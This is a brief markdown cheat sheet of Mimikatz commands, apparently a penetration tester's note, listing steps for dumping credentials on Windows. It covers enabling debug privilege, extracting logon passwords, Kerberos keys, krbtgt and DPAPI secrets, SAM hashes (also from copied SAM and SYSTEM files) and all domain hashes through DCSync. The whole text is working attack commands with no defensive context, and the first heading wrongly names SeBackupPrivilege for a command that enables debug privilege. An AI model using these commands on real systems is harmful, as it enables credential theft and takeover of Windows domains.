
## Mimikatz

1. Activate SeBackupPrivilege

```
privilege::debug
```
##### Logon-Sessions

```
sekurlsa::logonpasswords
```

```
sekurlsa::ekeys
sekurlsa::krbtgt
sekurlsa::dpapi
```
##### SAM

```
lsadump::sam
```

##### Specific SAM & SYSTEM Files

```
lsadump::sam /sam:C:Temp\SAM /system:C:\Temp\SYSTEM
```

##### Domain Hashes

```
lsadump::dcsync /all /csv
```